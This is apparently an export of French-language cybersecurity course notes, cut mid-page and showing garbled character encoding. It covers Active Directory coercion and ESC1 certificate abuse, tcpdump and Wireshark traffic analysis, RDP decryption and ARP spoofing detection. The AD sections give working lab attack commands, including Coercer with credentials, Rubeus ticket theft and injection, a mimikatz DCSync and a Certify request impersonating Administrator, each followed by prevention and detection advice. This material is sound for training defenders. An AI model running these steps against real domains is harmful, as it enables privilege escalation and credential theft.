Regularly audit delegation settings and RPC exposure in your environment.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Object ACLs</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80b8-a496-d83a9d76b10a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaques par Coercition dans Active Directory
Description

Les attaques par coercition sont devenues une m√©thode fiable pour √©lever les privil√®ges d‚Äôun utilisateur standard jusqu‚Äôaux privil√®ges d‚Äôadministrateur de domaine. Dans un environnement Active Directory (AD) classique, la majorit√© des configurations sont vuln√©rables √† ce type d‚Äôattaque.

L‚Äôexploit PrinterBug est l‚Äôun des premiers exemples connus de coercition. Depuis, d‚Äôautres fonctions RPC vuln√©rables ont √©t√© identifi√©es. Elles permettent √† un utilisateur du domaine de forcer un serveur distant (RemoteServer\$) √† s‚Äôauthentifier aupr√®s d‚Äôun autre h√¥te contr√¥l√© par l‚Äôattaquant. L‚Äôoutil Coercer a √©t√© con√ßu pour exploiter plusieurs de ces fonctions RPC.

Impact

Une fois la coercition √©tablie, l‚Äôattaquant peut effectuer diff√©rents types d‚Äôattaques en cha√Æne :
Relai vers un autre contr√¥leur de domaine (DC) pour ex√©cuter une attaque DCSync (si la signature SMB est d√©sactiv√©e).
Forcer un DC √† se connecter √† un serveur en D√©l√©gation Non Restreinte, capturant ainsi un TGT dans la m√©moire du serveur (outils : Rubeus, Mimikatz).
Relai vers les services de certificats Active Directory (ADCS) pour g√©n√©rer un certificat s‚Äôidentifiant comme un DC.
Configurer une d√©l√©gation Kerberos bas√©e sur les ressources afin de s‚Äôauthentifier comme n‚Äôimporte quel administrateur sur la machine cibl√©e.

M√©thodologie de l‚Äôattaque

Dans cet exemple, l‚Äôobjectif est de capturer un TGT sur un serveur compromis configur√© avec la d√©l√©gation non restreinte, √† l‚Äôaide de l‚Äôoutil Coercer.
√âtapes :
Identifier les serveurs avec D√©l√©gation Non Restreinte (via PowerView) :

   Get-NetComputer -Unconstrained | select samaccountname
   Exemple de sortie :

   samaccountname

   DC1$
   SERVER01$
   WS001$
   DC2$
   Surveiller les tickets Kerberos avec Rubeus sur le serveur compromis (ex: WS001) :

   .\Rubeus.exe monitor /interval:1
   Lancer Coercer depuis une machine Kali pour forcer l‚Äôauthentification du DC vers WS001 :

   Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
   Exemple de sortie :

   [&gt;] Pipe '\PIPE\lsarpc' is accessible!
   ...
   [&gt;] Pipe '\PIPE\spoolss' is accessible!
   ...
   [+] All done!
   Capturer le TGT du DC sur WS001 avec Rubeus :

   [] Found new TGT:
     User : DC1$@EAGLE.LOCAL
   Injecter le ticket captur√© pour s‚Äôauthentifier dans le domaine :

   .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
   Lancer une attaque DCSync avec Mimikatz :

   .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
   Pr√©vention

Windows ne permet pas nativement de surveiller ou bloquer les appels RPC sensibles. Deux approches de pr√©vention :
Pare-feu RPC tiers : des outils comme le RPC Firewall* de Zero Networks permettent d‚Äôauditer et de bloquer des fonctions RPC sp√©cifiques.
Restriction des ports sortants 139 et 445 : bloquer ces ports sur les DC et serveurs critiques emp√™che le relai d‚Äôauthentification vers les attaquants.

D√©tection

D√©tecter l‚Äôabus de coercition via RPC reste complexe sans solutions tierces :
Analyse des journaux de pare-feu : les attaques r√©ussies g√©n√®rent du trafic sortant inhabituel, souvent sur le port 445.
D√©tection des connexions bloqu√©es : bloquer les ports mentionn√©s emp√™che la r√©ception de TGT et toute tentative g√©n√®re une alerte utile.

Conclusion

En combinant filtrage RPC et blocage des ports r√©seau strat√©giques, les organisations renforcent significativement leur s√©curit√© face aux attaques par coercition.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">PKI - ESC1</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8032-887b-c90238b5e678"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaque ESC1 ‚Äì Abus des Active Directory Certificate Services (AD CS)
Description

La recherche Certified Pre-Owned par SpecterOps a mis en lumi√®re les Active Directory Certificate Services (AD CS) comme vecteur d‚Äôattaque privil√©gi√© en raison de nombreuses mauvaises configurations fr√©quentes. Les certificats offrent un fort avantage aux attaquants :
Validit√© longue dur√©e (souvent un an ou plus).
Les r√©initialisations de mots de passe n‚Äôinvalident pas les certificats d√©j√† √©mis.
Des mod√®les mal configur√©s permettent √† des attaquants d‚Äôobtenir des certificats pour le compte d'autres utilisateurs.
Le compromis de la cl√© priv√©e d‚Äôune autorit√© de certification permet de forger des "certificats dor√©s" (Golden Certificates).

L‚Äôune des m√©thodes les plus notoires d‚Äô√©l√©vation de privil√®ge est ESC1, qui repose sur les caract√©ristiques suivantes :
Pas d‚Äôapprobation ou de validation manuelle requise.
Le mod√®le permet l‚Äôauthentification client (Client Authentication) ou la connexion par carte √† puce.
Le drapeau CTFLAGENROLLEESUPPLIESSUBJECT est activ√©, permettant √† l‚Äôutilisateur de fournir lui-m√™me le nom du sujet (SAN).

Ex√©cution de l‚Äôattaque ESC1
Rechercher les mod√®les vuln√©rables avec Certify :

.\Certify.exe find /vulnerable
Exemple de r√©sultat :
Le mod√®le UserCert est vuln√©rable car :
Accessible √† tous les utilisateurs du domaine.
Permet la d√©finition du Subject Alternative Name (SAN) (donc l'usurpation d'autres identit√©s).
Ne n√©cessite pas d‚Äôapprobation d‚Äôun responsable.
Permet l‚Äôauthentification client (logon).
Demander un certificat en usurpant l‚Äôidentit√© de Administrator :

.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
Cela g√©n√®re un certificat au format PEM.
Convertir le certificat en format PFX (compatible avec Rubeus) :

sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Utiliser Rubeus pour obtenir un TGT en tant qu‚ÄôAdministrator :

.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
Une fois le TGT charg√©, vous pouvez par exemple acc√©der √† \\dc1\c$ en tant qu‚ÄôAdministrateur.

Pr√©vention

Pour se pr√©munir contre l‚Äôexploitation du mod√®le ESC1 :
D√©sactiver le flag CTFLAGENROLLEESUPPLIESSUBJECT sur les mod√®les de certificat.
Activer l‚Äôapprobation manuelle (par un Certificate Manager) pour toute demande de certificat.

Il est recommand√© de scanner r√©guli√®rement l‚Äôenvironnement PKI avec Certify ou un outil similaire afin de rep√©rer les mauvaises configurations.

D√©tection
√âv√©nements Windows :
ID 4886 : Demande de certificat enregistr√©e.
ID 4887 : Certificat √©mis.
ID 4768 : TGT √©mis suite √† l‚Äôauthentification avec un certificat.
Limitation : Les journaux ne montrent pas directement la valeur du SAN, ce qui peut limiter l‚Äôanalyse automatique.
Utilisation de certutil pour consulter les certificats √©mis :

certutil -view
Exemple de r√©cup√©ration de journaux par script :

$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
Surveillance √† distance :

Si l‚Äôacc√®s GUI au serveur PKI est indisponible, utilisez une session PowerShell distante :

New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
Remarques
Surveiller √©troitement les activit√©s PKI est essentiel pour s√©curiser l‚ÄôActive Directory.
L‚Äô√©mission non autoris√©e de certificats peut fournir aux attaquants un acc√®s durable et silencieux √† l‚Äôenvironnement.</code></pre></div></details><p class="" id="1e925200-7eb4-8087-b216-d121008fed1b"> <br/> <br/><br/> </p><p class="" id="1e925200-7eb4-80ea-832f-fe4324e99ef4"> </p><p class="" id="1e925200-7eb4-801b-b37c-e7777bfc1963"><br/></p><p class="" id="1e925200-7eb4-80dc-9d9f-dfd4256ed5e2"> <br/> <br/> <br/><br/> <br/><br/><br/><br/><br/></p><p class="" id="1e925200-7eb4-806f-af4e-ec28d90bfda0"> </p><p class="" id="1e925200-7eb4-80d2-8e97-da73fb90464c"> </p><p class="" id="1e925200-7eb4-8060-8b5d-f68d961dc5aa"> <br/><br/><br/></p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intro to Network Traffic Analysis</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tcpdump Fundamentals</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8068-b6da-ec0a98775b5e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction √† Tcpdump

Tcpdump est un analyseur de paquets en ligne de commande (packet sniffer) utilis√© pour capturer et interpr√©ter les trames r√©seau provenant des interfaces r√©seau. Principalement disponible sur les syst√®mes Unix/Linux, Tcpdump permet d‚Äôobserver le trafic r√©seau "en direct", ce qui en fait un outil indispensable pour l‚Äôanalyse, le d√©pannage et l‚Äôinvestigation r√©seau.
Tcpdump requiert les droits root pour acc√©der aux interfaces mat√©rielles r√©seau. Sur les syst√®mes Linux, il est g√©n√©ralement ex√©cut√© via sudo.
Sur Windows, on peut utiliser WinDump ou lancer Tcpdump via WSL (Windows Subsystem for Linux).

Options de base pour la capture

Tcpdump propose de nombreux commutateurs (switches) pour personnaliser les captures :

| Option              | Description                                                     |
| ------------------- | --------------------------------------------------------------- |
| -D                | Affiche les interfaces r√©seau disponibles.                      |
| -i                | Sp√©cifie une interface √† utiliser (ex : -i eth0).             |
| -n                | D√©sactive la r√©solution des noms d‚Äôh√¥tes.                       |
| -nn               | D√©sactive la r√©solution des noms d‚Äôh√¥tes et des ports.      |
| -e                | Affiche l‚Äôen-t√™te Ethernet dans les r√©sultats.                  |
| -X                | Affiche le contenu des paquets en hexad√©cimal et ASCII. |
| -v, -vv, -vvv | Augmente le niveau de verbosit√©.                                |
| -c                | Capture un nombre d√©fini de paquets, puis quitte.               |
| -s                | D√©finit la longueur maximale des paquets captur√©s.              |
| -S                | Affiche les num√©ros de s√©quence TCP absolus.                    |
| -q                | Affiche un r√©sum√© minimal du protocole.                         |
| -r                | Lit les paquets depuis un fichier.                              |
| -w                | √âcrit les paquets dans un fichier pour une analyse ult√©rieure.  |

Exemples d'utilisation
Afficher les interfaces disponibles

sudo tcpdump -D
Capturer le trafic d'une interface sp√©cifique

sudo tcpdump -i eth0
D√©sactiver la r√©solution DNS et des ports

sudo tcpdump -i eth0 -nn
Inclure l‚Äôen-t√™te Ethernet

sudo tcpdump -i eth0 -e
Afficher les paquets en HEX/ASCII

sudo tcpdump -i eth0 -X
Combiner plusieurs options

sudo tcpdump -i eth0 -nnvXX
Interpr√©tation de la sortie Tcpdump

La sortie peut inclure plusieurs champs :

| Champ                       | Description                                          |
| --------------------------- | ---------------------------------------------------- |
| Horodatage              | Heure de capture du paquet.                          |
| Protocole               | Protocole de couche sup√©rieure (IP, TCP, UDP, etc.). |
| Source / Destination    | IP et ports d‚Äôorigine et de destination.             |
| Drapeaux TCP            | Indicateurs SYN, ACK, RST, etc.                      |
| N¬∞ de s√©quence et d‚ÄôACK | Suivi des segments TCP.                              |
| Options du protocole    | Fen√™tre TCP, SACK, etc.                              |

Lecture &amp; √âcriture de fichiers
Sauvegarder une capture dans un fichier .pcap :

sudo tcpdump -i eth0 -w ~/capture.pcap
Lire une capture existante :

sudo tcpdump -r ~/capture.pcap
Astuce : Ajoutez les options comme -X ou -vvv pour une lecture plus d√©taill√©e.

Utilisation avanc√©e : Tcpdump comme IDS l√©ger

Tcpdump peut √™tre int√©gr√© dans des scripts de d√©tection d‚Äôintrusion simples, par exemple :
D√©tecter un nombre inhabituel de requ√™tes ICMP (ping) depuis une IP.
Automatiser des alertes ou des blocages via des r√®gles de pare-feu ou des logs.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tcpdump Packet Filtering</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8057-ac7f-d3dfddb8779e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Filtres Avanc√©s avec Tcpdump

L‚Äôutilisation de filtres avanc√©s dans Tcpdump permet de r√©duire le volume de trafic affich√© ou enregistr√©, ce qui am√©liore les performances et √©conomise de l‚Äôespace disque. Ces filtres peuvent √™tre associ√©s √† la syntaxe classique de Tcpdump pour effectuer des captures cibl√©es : d‚Äôun simple h√¥te √† des flux tr√®s sp√©cifiques via des ports ou des indicateurs TCP.

Filtres Tcpdump Utiles

| Filtre               | Effet                                                               |
| -------------------- | ------------------------------------------------------------------- |
| host               | Affiche le trafic impliquant un h√¥te donn√© (trafic bidirectionnel). |
| src / dst        | Filtre selon l‚Äôadresse source ou destination.                       |
| net                | Filtre le trafic d‚Äôun r√©seau (notation CIDR, ex : /24).           |
| proto              | Filtre par protocole (ex : tcp, udp, icmp, ether).          |
| port               | Filtre le trafic avec un port source ou destination sp√©cifique.     |
| portrange          | Filtre un intervalle de ports (ex : 0-1024).                      |
| less / greater   | Filtre selon la taille des paquets.                                 |
| and / or / not | Combine, ajoute ou exclut des conditions.                           |

Exemples de Filtres Pratiques
Filtrage par H√¥te

sudo tcpdump -i eth0 host 172.16.146.2
Filtrage par Source

sudo tcpdump -i eth0 src host 172.16.146.2
Filtrage par Port Source

sudo tcpdump -i eth0 tcp src port 80
Filtrage par R√©seau Destination

sudo tcpdump -i eth0 dst net 172.16.146.0/24
Filtrage par Protocole

sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17  # UDP (protocole 17)
Filtrage par Port / Plage de Ports

sudo tcpdump -i eth0 tcp port 443
sudo tcpdump -i eth0 portrange 0-1024
Filtrage par Taille de Paquet

sudo tcpdump -i eth0 less 64
sudo tcpdump -i eth0 greater 500
Combinaisons de Filtres
Avec AND

sudo tcpdump -i eth0 host 192.168.0.1 and port 23
Avec OR

sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
Avec NOT

sudo tcpdump -r sus.pcap not icmp
Capture vs. Analyse Post√©rieure
Filtrage en pr√©-capture : les paquets non correspondants ne sont pas enregistr√©s ‚Üí gain de place mais perte possible d‚Äôinfos.
Filtrage en post-capture : les paquets sont filtr√©s lors de la lecture d‚Äôun fichier .pcap, sans affecter les donn√©es d‚Äôorigine.

Astuces d‚ÄôInterpr√©tation

| Option                 | Usage                                                                     |
| ---------------------- | ------------------------------------------------------------------------- |
| -S                   | Affiche les num√©ros de s√©quence TCP absolus.                              |
| -v, -X, -e       | Affiche plus de d√©tails sur les paquets.                                  |
| -c, -n, -s, -q | Modifie le format ou le volume de sortie.                                 |
| -A                   | Affiche uniquement le contenu ASCII (pratique pour les donn√©es lisibles). |
Exemple : ASCII uniquement

sudo tcpdump -Ar telnet.pcap
Analyse de contenu avec grep

Filtrer un fichier .pcap en temps r√©el :

sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
Filtrage avanc√© sur les flags TCP

Pour cibler les paquets avec le flag SYN activ√© :

tcpdump -i eth0 'tcp[13] &amp; 2 != 0'
R√©f√©rences RFC des Protocoles

| Protocole | RFC                                                     |
| --------- | ------------------------------------------------------- |
| IP        | [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) |
| ICMP      | [RFC 792](https://datatracker.ietf.org/doc/html/rfc792) |
| TCP       | [RFC 793](https://datatracker.ietf.org/doc/html/rfc793) |
| UDP       | [RFC 768](https://datatracker.ietf.org/doc/html/rfc768) |</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Interrogating Network Traffic With Capture and Display Filters</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-809e-be79-ef705d5f3a6f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectifs du Laboratoire Tcpdump
Apprendre √† filtrer le trafic captur√© pour en extraire des donn√©es utiles.
Identifier les serveurs r√©pondant aux requ√™tes DNS et HTTP/HTTPS.
Analyser les mod√®les de communication r√©seau et les connexions.

T√¢ches √† R√©aliser

| T√¢che                                                     | Description                                                                                                              | Commande / D√©tails                                                                             |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| T√¢che 1 : Lecture du fichier .pcap sans filtre        | Observez la capture brute.                                                                                               | tcpdump -r fichier.pcap                                                                      |
| T√¢che 2 : Identifier les types de trafic              | Recherchez les protocoles et ports utilis√©s.                                                                     | Protocoles typiques : DNS (53), HTTP (80), HTTPS (443)                                         |
| T√¢che 3 : Identifier les √©changes et mod√®les          | Analysez les connexions client/serveur.&lt;br&gt;Rep√©rez les handshakes TCP.                                           | tcpdump -S -r fichier.pcap pour voir les s√©quences TCP compl√®tes                             |
| T√¢che 4 : Analyse d√©taill√©e de la capture             | Trouvez :&lt;br&gt;- Timestamp de la premi√®re conversation&lt;br&gt;- R√©ponse DNS pour apache.org&lt;br&gt;- Protocole en fonction du port | tcpdump -r fichier.pcap -nn&lt;br&gt;tcpdump -r fichier.pcap src host [IP]                       |
| T√¢che 5 : Filtrer le trafic DNS uniquement            | Isolez les paquets UDP sur port 53.&lt;br&gt;Analysez les noms de domaine, types d‚Äôenregistrements.                        | sudo tcpdump -r fichier.pcap udp and port 53&lt;br&gt;tcpdump -X -r fichier.pcap                 |
| T√¢che 6 : Filtrer le trafic HTTP/HTTPS                | Isolez les ports 80 et 443.&lt;br&gt;Identifiez les m√©thodes HTTP (GET, POST) et les codes r√©ponse.                    | tcpdump -r fichier.pcap 'port 80 or port 443'                                                |
| T√¢che 7 : Analyser le premier serveur de conversation | Examinez la r√©ponse HTTP pour en d√©duire la techno serveur (Apache, Nginx...).                                       | tcpdump -X -r fichier.pcap&lt;br&gt;Regardez dans le contenu HTTP : headers comme Server: Apache |

Pistes d‚ÄôAnalyse √† Suivre

Posez-vous les questions suivantes pendant l'analyse :
Quels types de trafic sont pr√©sents (protocoles, ports) ?
Combien de conversations uniques ou h√¥tes distincts ?
Quel est le timestamp de la premi√®re connexion TCP ?
Quels filtres Tcpdump peuvent simplifier l‚Äôanalyse ?
Quels serveurs r√©pondent sur des ports standards ?
Quels types de requ√™tes DNS et m√©thodes HTTP sont utilis√©s ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Wireshark Advanced Usage</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-802d-8e9a-f1fd244107d5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Plugins dans Wireshark 

Wireshark propose plusieurs plugins puissants accessibles via les menus "Statistics" et "Analyze", permettant une analyse approfondie du trafic r√©seau.

Onglet "Statistics" (Statistiques)

Permet de visualiser des rapports d√©taill√©s sur le trafic captur√©, notamment :
R√©partition par protocoles
Top IP / h√¥tes les plus bavards
Types de conversations (TCP, UDP, IPX, etc.)

Onglet "Analyze" (Analyser)

Offre des outils pour :
Suivre les flux TCP
Filtrer par type de conversation
Cr√©er des filtres personnalis√©s
Acc√©der √† des diagnostics experts sur les anomalies r√©seau

Suivre un flux TCP

Wireshark peut reconstituer un flux TCP complet (conversation entre deux h√¥tes) dans un format lisible, id√©al pour analyser des √©changes HTTP, FTP, etc.
M√©thode :
Clic droit sur un paquet du flux.
S√©lectionnez Follow &gt; TCP Stream.
Une fen√™tre s‚Äôouvre avec toute la conversation reconstitu√©e.
Filtre alternatif :

tcp.stream eq #
Remplacez # par le num√©ro du flux (visible dans la colonne "Stream Index") pour afficher uniquement les paquets de cette conversation.

Extraction de donn√©es ou fichiers

Si une conversation compl√®te est captur√©e, Wireshark peut extraire des fichiers transmis, notamment via FTP, HTTP ou SMB.
√âtapes pour extraire un fichier :
Arr√™tez la capture.
Allez dans File &gt; Export Objects, puis choisissez le protocole (HTTP, DICOM, SMB, etc.).
S√©lectionnez les fichiers list√©s et cliquez sur Save As pour les extraire.

Analyse du protocole FTP

Le protocole FTP utilise :
Port 21 pour les commandes de contr√¥le (authentification, liste de fichiers).
Port 20 pour le transfert de donn√©es.
Filtres utiles dans Wireshark :

| Filtre                | Fonction                                              |
| --------------------- | ----------------------------------------------------- |
| ftp                 | Affiche tout le trafic FTP (port 21)                  |
| ftp.request.command | Affiche les commandes FTP (USER, PASS, RETR, STOR...) |
| ftp-data            | Montre les transferts de fichiers sur le port 20      |

Reconstruction d‚Äôun fichier FTP depuis un .pcap :
Filtrer le trafic FTP :

   ftp
   Identifier les commandes :

   ftp.request.command
   Permet de rep√©rer les noms de fichiers et les tentatives de login.
Trouver les donn√©es transf√©r√©es :

   ftp-data
   Suivre le flux TCP du fichier souhait√© :
Clic droit &gt; Follow &gt; TCP Stream
Choisir Raw comme affichage
Enregistrer le contenu avec le nom de fichier original
V√©rifier le type du fichier (par exemple avec file sous Linux) pour s'assurer qu‚Äôil a √©t√© correctement reconstruit.

Ce processus permet de r√©aliser des analyses forensiques pr√©cises, d‚Äôextraire des fichiers transmis sur le r√©seau et d‚Äôidentifier des activit√©s suspectes ou malveillantes.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Packet Inception, Dissecting Network Traffic With Wireshark</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8054-9e57-eef6579b0e19"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectifs du Lab : Analyse de trafic HTTP avec Wireshark

Ce laboratoire vous guide √©tape par √©tape pour analyser le trafic HTTP, identifier des transferts de fichiers (notamment des images JPEG), et extraire des fichiers √† partir d‚Äôune capture r√©seau.

T√¢che 1 : Ouvrir un fichier PCAP

But : Charger un fichier .pcap pr√©-captur√© pour analyser le trafic HTTP.

√âtapes :
Ouvrir Wireshark.
Aller dans Fichier ‚Üí Ouvrir (File ‚Üí Open).
S√©lectionner Wireshark-lab-2.pcap.
Le fichier s‚Äôouvre et affiche l‚Äôensemble du trafic r√©seau captur√©.

T√¢che 2 : Filtrer le trafic HTTP

But : Se concentrer uniquement sur les communications HTTP (port 80), en particulier les requ√™tes GET et les r√©ponses 200 OK (indiquant un transfert r√©ussi de fichiers).

√âtapes :
Dans la barre de filtres, taper :

   http
   V√©rifier que la barre devient verte (syntaxe correcte).
Parcourir les paquets :
Rechercher les lignes contenant GET.
Identifier les r√©ponses HTTP/1.1 200 OK.

T√¢che 3 : Suivre un flux TCP

But : Examiner une session HTTP compl√®te associ√©e √† un transfert de fichier.

√âtapes :
Cliquer sur un paquet HTTP 200 OK.
Clic droit ‚Üí Follow ‚Üí TCP Stream.
Une nouvelle fen√™tre affiche la conversation compl√®te.
Confirmer que le fichier a bien √©t√© transf√©r√© dans ce flux.

T√¢che 4 : Rechercher des images JFIF

But : Identifier les fichiers image JPEG (format JFIF) transf√©r√©s via HTTP.

√âtapes :
Effacer tout filtre actif.
Taper le filtre suivant :

   http &amp;&amp; image-jfif
   Ce filtre isole uniquement les paquets contenant des images JPEG int√©gr√©es, facilitant leur d√©tection.

T√¢che 5 : Extraire les images du trafic

But : Exporter les fichiers image d√©tect√©s afin de les analyser ou de les transmettre √† l‚Äô√©quipe de s√©curit√©.

√âtapes :
Aller dans le menu File ‚Üí Export Objects ‚Üí HTTP.
Parcourir la liste et rep√©rer les fichiers JPEG (ex. : file.JPG).
Cliquer sur Save As pour enregistrer localement le fichier image.

Conseil de s√©curit√© :

Les images extraites peuvent contenir des donn√©es cach√©es (st√©ganographie) ou avoir √©t√© exfiltr√©es ill√©galement. Il est essentiel de les examiner avec soin selon les instructions du responsable s√©curit√©.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Decrypting RDP Connections</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80da-b93d-d1c9254b4952"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Laboratoire : Analyse de sessions RDP chiffr√©es avec Wireshark

Ce laboratoire montre comment identifier, d√©chiffrer et analyser le trafic RDP contenu dans un fichier .pcapng √† l‚Äôaide de Wireshark, en utilisant une cl√© priv√©e RSA pour acc√©der aux donn√©es sensibles comme le nom d'utilisateur.

T√¢che 1 : Ouvrir un fichier PCAP RDP

But : Charger la capture RDP √† analyser.

√âtapes :
Extraire le fichier RDP-analysis.zip.
Ouvrir Wireshark.
S√©lectionner Fichier ‚Üí Ouvrir (File ‚Üí Open) et choisir rdp.pcapng.

T√¢che 2 : Analyse initiale du trafic RDP

But : Identifier le trafic RDP dans la capture, g√©n√©ralement sur le port TCP 3389.

Commandes de filtre :
Pour voir uniquement le trafic RDP :

  rdp
  Pour filtrer par port :

  tcp.port == 3389
  T√¢che 3 : Ajouter la cl√© de d√©chiffrement dans Wireshark

But : D√©chiffrer le trafic RDP avec une cl√© RSA priv√©e r√©cup√©r√©e depuis l‚Äôh√¥te de Bob.

√âtapes :
Aller dans √âdition ‚Üí Pr√©f√©rences ‚Üí Protocoles ‚Üí TLS.
Sous "RSA Keys List", cliquer sur √âditer puis Ajouter une nouvelle entr√©e :
Adresse IP : 10.129.43.29
Port : 3389
Protocole : tpkt (ou laisser vide si n√©cessaire)
Fichier de cl√© : S√©lectionner le fichier server.key
Enregistrer les changements.
Rafra√Æchir le fichier .pcapng dans Wireshark.

T√¢che 4 : Analyse du trafic RDP d√©chiffr√©

But : Observer les donn√©es maintenant lisibles et examiner le contenu des sessions RDP.

Filtre recommand√© :

rdp
Astuce : Vous pouvez aussi suivre les flux TCP pour voir l‚Äô√©change complet entre client et serveur.

Questions d‚Äôanalyse
Adresse IP de l'h√¥te initiateur :
  Chercher le premier paquet de la poign√©e de main TCP (SYN).
  R√©ponse : 10.129.43.27
Nom d'utilisateur utilis√© dans la session RDP :
  Dans le trafic d√©chiffr√© (filtr√© avec tcp.port == 3389), chercher dans les paquets marqu√©s "Ignored Unknown Record". Le contenu ASCII peut afficher le nom d'utilisateur.

R√©sum√© et enseignement

Gr√¢ce √† la cl√© priv√©e RSA, Wireshark permet de d√©chiffrer des protocoles habituellement s√©curis√©s comme RDP. Cela est crucial en analyse forensique et en r√©ponse √† incident, car :
Le contenu des sessions RDP peut √™tre examin√©.
Des donn√©es sensibles comme les identifiants de connexion peuvent √™tre r√©cup√©r√©es.
Cela renforce l‚Äôimportance de prot√©ger les cl√©s priv√©es et de restreindre les acc√®s RDP.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Intermediate Network Traffic Analysis Overview</summary><div class="indented"><p class="" id="1e925200-7eb4-8014-8183-fce4ebc30190">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ARP Spoofing &amp; Abnormality Detection</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80a5-9389-f611cede7e0a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d‚Äôensemble
Le protocole ARP (Address Resolution Protocol) est souvent la cible d‚Äôattaques comme :
Man-in-the-Middle (MITM)
D√©ni de service (DoS)
Ces attaques sont d√©tectables car elles s'appuient sur des diffusions r√©seau (broadcast), capturables via un sniffer de paquets.

Fonctionnement du protocole ARP
Les h√¥tes utilisent ARP pour conna√Ætre l‚Äôadresse MAC associ√©e √† une IP sur le r√©seau local.

√âtapes du processus ARP :
L‚Äôh√¥te A v√©rifie son cache ARP.
Si l‚ÄôIP n‚Äôest pas trouv√©e, il diffuse une requ√™te ARP (ARP Request).
L‚Äôh√¥te B r√©pond avec une r√©ponse ARP (ARP Reply) contenant son adresse IP et MAC.
Le cache ARP de A est mis √† jour avec la nouvelle correspondance IP-MAC.

Empoisonnement / Usurpation ARP (ARP Poisoning &amp; Spoofing)
ARP Cache Poisoning : L‚Äôattaquant envoie de fausses trames ARP pour tromper les caches ARP.
√âtapes de l‚Äôattaque :
L‚Äôattaquant envoie des ARP Replies falsifi√©es √† la victime et au routeur.
Les deux mettent √† jour leur cache avec la fausse adresse MAC de l‚Äôattaquant.
L‚Äôattaquant devient un relais, intercepte le trafic et peut le modifier (attaque MITM).

D√©tection &amp; Pr√©vention
D√©tection :
Surveiller les mod√®les inhabituels de trafic ARP (ex. : requ√™tes r√©p√©t√©es).
Rep√©rer des incoh√©rences IP-MAC dans les r√©ponses ARP.
Pr√©vention :
Entr√©es ARP statiques : emp√™chent la mise √† jour automatique (mais difficiles √† g√©rer).
S√©curit√© des ports sur les switches : limite les MAC autoris√©es sur un port r√©seau.

D√©tection pratique avec tcpdump et Wireshark
Installation de tcpdump :

sudo apt install tcpdump -y
Capture du trafic ARP :

sudo tcpdump -i eth0 -w capturearp.pcapng
Analyse dans Wireshark :

wireshark capturearp.pcapng
Filtres Wireshark utiles :

| But                    | Filtre                                              |
| ---------------------- | --------------------------------------------------- |
| Requ√™tes ARP           | arp.opcode == 1                                   |
| R√©ponses ARP           | arp.opcode == 2                                   |
| Duplications d‚Äôadresse | arp.duplicate-address-detected &amp;&amp; arp.opcode == 2 |

Examiner les anomalies IP/MAC

Utilisez arp -a sur Linux pour inspecter la table ARP :

arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
Dans Wireshark, filtrez les adresses MAC suspectes :

